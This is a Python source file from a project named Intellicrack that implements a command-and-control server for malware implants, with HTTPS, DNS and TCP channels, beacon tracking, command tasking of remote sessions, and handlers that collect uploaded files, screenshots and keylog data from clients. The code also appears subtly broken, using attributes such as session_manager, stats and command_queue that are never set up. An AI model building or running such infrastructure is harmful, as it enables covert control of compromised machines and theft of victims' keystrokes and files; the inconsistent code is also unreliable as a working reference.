"""
This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import asyncio
import logging
import os
import queue
import time
from typing import Any, Callable, Dict, List, Optional

"""
Command and Control Server

Main C2 server implementation with multi-protocol support,
encryption, and session management.
"""

from .base_c2 import BaseC2
from ...utils.constants import C2_DEFAULTS

logger = logging.getLogger(__name__)


class C2Server(BaseC2):
    """
    Advanced Command and Control server with multi-protocol support
    and enterprise-grade security features.
    """

    def __init__(self, host: str = None, port: int = None):
        """Initialize the C2 server with host and port configuration."""
        self.host = host or C2_DEFAULTS["http"]["host"]
        self.port = port or C2_DEFAULTS["http"]["port"]
        self.running = False
        self.server = None
        self.logger = logging.getLogger(__name__)
        self.clients: Dict[str, Any] = {}
        self.sessions: Dict[str, Any] = {}
        self.commands_queue = queue.Queue()
        self.event_handlers: Dict[str, List[Callable]] = {
            "client_connected": [],
            "client_disconnected": [],
            "command_received": [],
            "message_received": []
        }


    def _initialize_protocols(self):
        """Initialize all supported communication protocols."""
        protocols_config = []

        # HTTPS Protocol
        if self.config.get("https_enabled", True):
            https_config = self.config.get("https", {})
            # Use environment variables with fallback to config values
            https_host = os.environ.get("C2_HTTPS_HOST", https_config.get("host", C2_DEFAULTS["https"]["host"]))
            https_port = int(os.environ.get("C2_HTTPS_PORT", https_config.get("port", C2_DEFAULTS["https"]["port"])))

            protocols_config.append({
                "type": "https",
                "server_url": f"https://{https_host}:{https_port}",
                "headers": https_config.get("headers", {}),
                "priority": 1
            })

        # DNS Protocol
        if self.config.get("dns_enabled", False):
            dns_config = self.config.get("dns", {})
            # Use environment variables with fallback to config values
            dns_domain = os.environ.get("C2_DNS_DOMAIN", dns_config.get("domain", C2_DEFAULTS["dns"]["domain"]))
            dns_host = os.environ.get("C2_DNS_HOST", dns_config.get("host", C2_DEFAULTS["dns"]["host"]))
            dns_port = int(os.environ.get("C2_DNS_PORT", dns_config.get("port", C2_DEFAULTS["dns"]["port"])))

            protocols_config.append({
                "type": "dns",
                "domain": dns_domain,
                "dns_server": f"{dns_host}:{dns_port}",
                "priority": 2
            })

        # TCP Protocol
        if self.config.get("tcp_enabled", False):
            tcp_config = self.config.get("tcp", {})
            # Use environment variables with fallback to config values
            tcp_host = os.environ.get("C2_TCP_HOST", tcp_config.get("host", C2_DEFAULTS["tcp"]["host"]))
            tcp_port = int(os.environ.get("C2_TCP_PORT", tcp_config.get("port", C2_DEFAULTS["tcp"]["port"])))

            protocols_config.append({
                "type": "tcp",
                "host": tcp_host,
                "port": tcp_port,
                "priority": 3
            })

        # Use base class method
        self.initialize_protocols(protocols_config, self.encryption_manager)

        # Convert to dict for server usage
        self.protocols = {p["type"]: p["handler"] for p in self.protocols}

    def _initialize_auth_tokens(self):
        """Initialize authentication tokens from configuration or generate new ones."""
        import secrets

        from ..utils.secrets_manager import get_secret, store_secret

        # Try to get existing auth tokens
        auth_tokens_str = get_secret("C2_AUTH_TOKENS", None)

        if auth_tokens_str:
            # Parse existing tokens
            try:
                self.auth_tokens = set(auth_tokens_str.split(","))
                self.logger.info(f"Loaded {len(self.auth_tokens)} authentication tokens")
            except Exception as e:
                self.logger.error(f"Failed to parse auth tokens: {e}")
                self.auth_tokens = set()
        else:
            # Generate new auth tokens
            num_tokens = self.config.get("auth_token_count", 5)
            new_tokens = []

            for _i in range(num_tokens):
                token = secrets.token_hex(32)
                self.auth_tokens.add(token)
                new_tokens.append(token)

            # Store tokens
            try:
                store_secret("C2_AUTH_TOKENS", ",".join(new_tokens))
                self.logger.info(f"Generated and stored {num_tokens} new authentication tokens")
            except Exception as e:
                self.logger.warning(f"Could not store auth tokens: {e}")

    async def _verify_auth_token(self, token: str, remote_addr: str) -> bool:
        """Verify authentication token with rate limiting."""
        try:
            # Check if IP is locked out
            if remote_addr in self.failed_auth_attempts:
                attempts_info = self.failed_auth_attempts[remote_addr]
                if attempts_info["count"] >= self.max_auth_attempts:
                    lockout_time = time.time() - attempts_info["last_attempt"]
                    if lockout_time < self.auth_lockout_duration:
                        self.logger.warning(f"Authentication blocked for {remote_addr} - lockout active")
                        return False
                    else:
                        # Reset after lockout expires
                        del self.failed_auth_attempts[remote_addr]

            # Verify token
            if token in self.auth_tokens:
                # Clear any failed attempts on successful auth
                if remote_addr in self.failed_auth_attempts:
                    del self.failed_auth_attempts[remote_addr]
                return True
            else:
                # Track failed attempt
                if remote_addr not in self.failed_auth_attempts:
                    self.failed_auth_attempts[remote_addr] = {
                        "count": 0,
                        "last_attempt": 0
                    }

                self.failed_auth_attempts[remote_addr]["count"] += 1
                self.failed_auth_attempts[remote_addr]["last_attempt"] = time.time()

                remaining_attempts = self.max_auth_attempts - self.failed_auth_attempts[remote_addr]["count"]
                if remaining_attempts > 0:
                    self.logger.warning(f"Failed auth from {remote_addr} - {remaining_attempts} attempts remaining")
                else:
                    self.logger.warning(f"Failed auth from {remote_addr} - locked out for {self.auth_lockout_duration} seconds")

                return False

        except Exception as e:
            self.logger.error(f"Error verifying auth token: {e}")
            return False

    async def start(self):
        """Start the C2 server and all protocol handlers."""
        try:
            # Use base class start preparation
            if not self.prepare_start("C2 server"):
                return

            # Start all protocol handlers
            tasks = []
            for protocol_name, protocol in self.protocols.items():
                task = asyncio.create_task(
                    self._start_protocol(protocol_name, protocol)
                )
                tasks.append(task)

            # Start beacon management
            beacon_task = asyncio.create_task(self._beacon_management_loop())
            tasks.append(beacon_task)

            # Start command processing
            command_task = asyncio.create_task(self._command_processing_loop())
            tasks.append(command_task)

            # Start statistics update
            stats_task = asyncio.create_task(self._update_statistics_loop())
            tasks.append(stats_task)

            self.logger.info("C2 server started successfully")

            # Wait for all tasks
            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception as e:
            self.logger.error(f"Failed to start C2 server: {e}")
            await self.stop()
            raise

    async def stop(self):
        """Stop the C2 server and cleanup resources."""
        try:
            self.logger.info("Stopping C2 server...")
            self.running = False

            # Stop all protocol handlers
            for protocol_name, protocol in self.protocols.items():
                try:
                    await protocol.stop()
                    self.logger.info(f"Stopped {protocol_name} protocol")
                except Exception as e:
                    self.logger.error(f"Error stopping {protocol_name} protocol: {e}")

            # Cleanup sessions
            await self.session_manager.cleanup_all_sessions()

            self.logger.info("C2 server stopped successfully")

        except Exception as e:
            self.logger.error(f"Error stopping C2 server: {e}")

    async def _start_protocol(self, protocol_name: str, protocol):
        """Start a specific protocol handler."""
        try:
            self.logger.info(f"Starting {protocol_name} protocol...")

            # Set up protocol event handlers
            protocol.on_connection = self._handle_new_connection
            protocol.on_message = self._handle_message
            protocol.on_disconnection = self._handle_disconnection
            protocol.on_error = self._handle_protocol_error

            # Start the protocol
            await protocol.start()

        except Exception as e:
            self.logger.error(f"Failed to start {protocol_name} protocol: {e}")

    async def _handle_new_connection(self, connection_info: Dict[str, Any]):
        """Handle new client connection with authentication."""
        try:
            self.logger.info(f"New connection attempt from {connection_info.get('remote_addr')}")

            # Check for authentication token
            auth_token = connection_info.get("auth_token")
            if not auth_token:
                self.logger.warning(f"Connection rejected - no authentication token from {connection_info.get('remote_addr')}")
                return None

            # Verify authentication token
            if not await self._verify_auth_token(auth_token, connection_info.get("remote_addr")):
                self.logger.warning(f"Connection rejected - invalid authentication token from {connection_info.get('remote_addr')}")
                return None

            # Authentication successful - create session
            session = await self.session_manager.create_session(connection_info)

            # Update statistics
            self.stats["total_connections"] += 1
            self.stats["active_sessions"] = len(self.session_manager.get_active_sessions())

            # Trigger event handlers
            await self._trigger_event("session_connected", session)

            self.logger.info(f"Authenticated connection established with {connection_info.get('remote_addr')}")
            return session

        except Exception as e:
            self.logger.error(f"Error handling new connection: {e}")
            return None

    async def _handle_message(self, session_id: str, message: Dict[str, Any]):
        """Handle incoming message from client."""
        try:
            session = self.session_manager.get_session(session_id)
            if not session:
                self.logger.warning(f"Received message for unknown session: {session_id}")
                return

            # Update session activity
            session.update_last_seen()

            # Process message based on type
            message_type = message.get("type", "unknown")

            if message_type == "beacon":
                await self._handle_beacon(session, message)
            elif message_type == "task_result":
                await self._handle_task_result(session, message)
            elif message_type == "file_upload":
                await self._handle_file_upload(session, message)
            elif message_type == "screenshot":
                await self._handle_screenshot(session, message)
            elif message_type == "keylog_data":
                await self._handle_keylog_data(session, message)
            else:
                self.logger.warning(f"Unknown message type: {message_type}")

        except Exception as e:
            self.logger.error(f"Error handling message: {e}")

    async def _handle_disconnection(self, session_id: str):
        """Handle client disconnection."""
        try:
            session = self.session_manager.get_session(session_id)
            if session:
                self.logger.info(f"Session {session_id} disconnected")

                # Update session status
                await self.session_manager.mark_session_inactive(session_id)

                # Update statistics
                self.stats["active_sessions"] = len(self.session_manager.get_active_sessions())

                # Trigger event handlers
                await self._trigger_event("session_disconnected", session)

        except Exception as e:
            self.logger.error(f"Error handling disconnection: {e}")

    async def _handle_protocol_error(self, protocol_name: str, error: Exception):
        """Handle protocol-specific errors."""
        self.logger.error(f"Protocol {protocol_name} error: {error}")
        await self._trigger_event("error_occurred", {
            "type": "protocol_error",
            "protocol": protocol_name,
            "error": str(error)
        })

    async def _handle_beacon(self, session, message: Dict[str, Any]):
        """Handle beacon message from client."""
        try:
            beacon_data = message.get("data", {})

            # Update beacon information
            self.beacon_manager.update_beacon(session.session_id, beacon_data)

            # Check for pending tasks
            pending_tasks = await self.session_manager.get_pending_tasks(session.session_id)

            if pending_tasks:
                # Send tasks to client
                response = {
                    "type": "tasks",
                    "tasks": pending_tasks
                }
                await session.send_message(response)

                # Mark tasks as sent
                for task in pending_tasks:
                    await self.session_manager.mark_task_sent(task["task_id"])

            # Trigger event
            await self._trigger_event("beacon_received", {
                "session": session,
                "beacon_data": beacon_data
            })

        except Exception as e:
            self.logger.error(f"Error handling beacon: {e}")

    async def _handle_task_result(self, session, message: Dict[str, Any]):
        """Handle task execution result from client."""
        try:
            task_id = message.get("task_id")
            result = message.get("result")
            success = message.get("success", False)

            # Store task result
            await self.session_manager.store_task_result(task_id, result, success)

            # Update statistics
            self.stats["commands_executed"] += 1

            # Trigger event
            await self._trigger_event("command_executed", {
                "session": session,
                "task_id": task_id,
                "result": result,
                "success": success
            })

        except Exception as e:
            self.logger.error(f"Error handling task result: {e}")

    async def _handle_file_upload(self, session, message: Dict[str, Any]):
        """Handle file upload from client."""
        try:
            filename = message.get("filename")
            file_data = message.get("data")
            file_size = len(file_data) if file_data else 0

            # Store uploaded file
            await self.session_manager.store_uploaded_file(
                session.session_id, filename, file_data
            )

            # Update statistics
            self.stats["data_transferred"] += file_size

            self.logger.info(f"Received file upload: {filename} ({file_size} bytes)")

        except Exception as e:
            self.logger.error(f"Error handling file upload: {e}")

    async def _handle_screenshot(self, session, message: Dict[str, Any]):
        """Handle screenshot from client."""
        try:
            screenshot_data = message.get("data")
            timestamp = message.get("timestamp", time.time())

            # Store screenshot
            await self.session_manager.store_screenshot(
                session.session_id, screenshot_data, timestamp
            )

            self.logger.info(f"Received screenshot from session {session.session_id}")

        except Exception as e:
            self.logger.error(f"Error handling screenshot: {e}")

    async def _handle_keylog_data(self, session, message: Dict[str, Any]):
        """Handle keylog data from client."""
        try:
            keylog_data = message.get("data")
            timestamp = message.get("timestamp", time.time())

            # Store keylog data
            await self.session_manager.store_keylog_data(
                session.session_id, keylog_data, timestamp
            )

            self.logger.debug(f"Received keylog data from session {session.session_id}")

        except Exception as e:
            self.logger.error(f"Error handling keylog data: {e}")

    async def _beacon_management_loop(self):
        """Main beacon management loop."""
        while self.running:
            try:
                # Check for inactive sessions
                inactive_sessions = self.beacon_manager.check_inactive_sessions()

                for session_id in inactive_sessions:
                    await self.session_manager.mark_session_inactive(session_id)
                    self.logger.info(f"Marked session {session_id} as inactive")

                # Update beacon statistics
                self.beacon_manager.update_statistics()

                await asyncio.sleep(30)  # Check every 30 seconds

            except Exception as e:
                self.logger.error(f"Error in beacon management loop: {e}")
                await asyncio.sleep(5)

    async def _command_processing_loop(self):
        """Main command processing loop."""
        while self.running:
            try:
                # Process pending commands from queue
                try:
                    command = await asyncio.wait_for(
                        self.command_queue.get(), timeout=1.0
                    )
                    await self._process_command(command)
                except asyncio.TimeoutError as e:
                    logger.error("asyncio.TimeoutError in c2_server: %s", e)
                    continue

            except Exception as e:
                self.logger.error(f"Error in command processing loop: {e}")
                await asyncio.sleep(1)

    async def _process_command(self, command: Dict[str, Any]):
        """Process a command from the queue."""
        try:
            session_id = command.get("session_id")
            command_type = command.get("type")
            command_data = command.get("data", {})

            session = self.session_manager.get_session(session_id)
            if not session:
                self.logger.warning(f"Cannot execute command for unknown session: {session_id}")
                return

            # Create task for the command
            task = await self.session_manager.create_task(
                session_id, command_type, command_data
            )

            self.logger.info(f"Created task {task['task_id']} for session {session_id}")

        except Exception as e:
            self.logger.error(f"Error processing command: {e}")

    async def _update_statistics_loop(self):
        """Update server statistics periodically."""
        while self.running:
            try:
                if self.stats["start_time"]:
                    self.stats["uptime_seconds"] = time.time() - self.stats["start_time"]

                await asyncio.sleep(60)  # Update every minute

            except Exception as e:
                self.logger.error(f"Error updating statistics: {e}")
                await asyncio.sleep(10)

    async def _trigger_event(self, event_type: str, data: Any):
        """Trigger event handlers for specific event type."""
        try:
            handlers = self.event_handlers.get(event_type, [])
            for handler in handlers:
                try:
                    if asyncio.iscoroutinefunction(handler):
                        await handler(data)
                    else:
                        handler(data)
                except Exception as e:
                    self.logger.error(f"Error in event handler for {event_type}: {e}")

        except Exception as e:
            self.logger.error(f"Error triggering event {event_type}: {e}")

    # Public API methods

    async def send_command(self, session_id: str, command_type: str, command_data: Dict[str, Any] = None):
        """Send a command to a specific session."""
        command = {
            "session_id": session_id,
            "type": command_type,
            "data": command_data or {}
        }
        await self.command_queue.put(command)

    def send_command_to_session(self, session_id: str, command: Dict[str, Any]) -> bool:
        """Send command to specific session (synchronous version for UI usage)."""
        try:
            # Validate session exists
            session = self.session_manager.get_session(session_id)
            if not session:
                self.logger.warning(f"Cannot send command to unknown session: {session_id}")
                return False

            # Extract command details
            command_type = command.get("type", "unknown")
            command_data = command.copy()

            # Remove type from data to avoid duplication
            if "type" in command_data:
                del command_data["type"]

            # Create task using asyncio in a thread-safe way
            loop = None
            try:
                loop = asyncio.get_event_loop()
            except RuntimeError as e:
                logger.error("Runtime error in c2_server: %s", e)
                # No event loop in current thread, create one
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)

            # Schedule the async command
            if loop.is_running():
                # If loop is running, schedule as a task
                asyncio.create_task(self.send_command(session_id, command_type, command_data))
            else:
                # If loop is not running, run until complete
                loop.run_until_complete(self.send_command(session_id, command_type, command_data))

            self.logger.info(f"Command '{command_type}' queued for session {session_id}")
            return True

        except Exception as e:
            self.logger.error(f"Failed to send command to session {session_id}: {e}")
            return False

    def add_event_handler(self, event_type: str, handler: Callable):
        """Add event handler for specific event type."""
        if event_type in self.event_handlers:
            self.event_handlers[event_type].append(handler)
        else:
            self.logger.warning(f"Unknown event type: {event_type}")

    def remove_event_handler(self, event_type: str, handler: Callable):
        """Remove event handler for specific event type."""
        if event_type in self.event_handlers:
            try:
                self.event_handlers[event_type].remove(handler)
            except ValueError as e:
                self.logger.error("Value error in c2_server: %s", e)
                pass

    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get list of active sessions."""
        return self.session_manager.get_active_sessions()

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get information about a specific session."""
        session = self.session_manager.get_session(session_id)
        return session.to_dict() if session else None

    def get_server_statistics(self) -> Dict[str, Any]:
        """Get server statistics."""
        stats = self.stats.copy()
        stats["beacon_stats"] = self.beacon_manager.get_statistics()
        stats["session_stats"] = self.session_manager.get_statistics()
        return stats

    def get_protocols_status(self) -> Dict[str, Any]:
        """Get status of all protocols."""
        status = {}
        for protocol_name, protocol in self.protocols.items():
            status[protocol_name] = {
                "enabled": True,
                "status": "running" if self.running else "stopped",
                "connections": getattr(protocol, "connection_count", 0)
            }
        return status

    def add_auth_token(self, token: str = None) -> str:
        """Add a new authentication token."""
        import secrets

        from ..utils.secrets_manager import store_secret

        if not token:
            token = secrets.token_hex(32)

        self.auth_tokens.add(token)

        # Update stored tokens
        try:
            store_secret("C2_AUTH_TOKENS", ",".join(self.auth_tokens))
            self.logger.info("Added new authentication token")
        except Exception as e:
            self.logger.warning(f"Could not update stored auth tokens: {e}")

        return token

    def remove_auth_token(self, token: str) -> bool:
        """Remove an authentication token."""
        from ..utils.secrets_manager import store_secret

        if token in self.auth_tokens:
            self.auth_tokens.remove(token)

            # Update stored tokens
            try:
                store_secret("C2_AUTH_TOKENS", ",".join(self.auth_tokens))
                self.logger.info("Removed authentication token")
                return True
            except Exception as e:
                self.logger.warning(f"Could not update stored auth tokens: {e}")
                # Re-add token since we couldn't persist the change
                self.auth_tokens.add(token)
                return False
        return False

    def get_auth_status(self) -> Dict[str, Any]:
        """Get authentication system status."""
        return {
            "auth_enabled": True,
            "token_count": len(self.auth_tokens),
            "locked_out_ips": len([ip for ip, info in self.failed_auth_attempts.items()
                                   if info["count"] >= self.max_auth_attempts]),
            "max_attempts": self.max_auth_attempts,
            "lockout_duration": self.auth_lockout_duration
        }
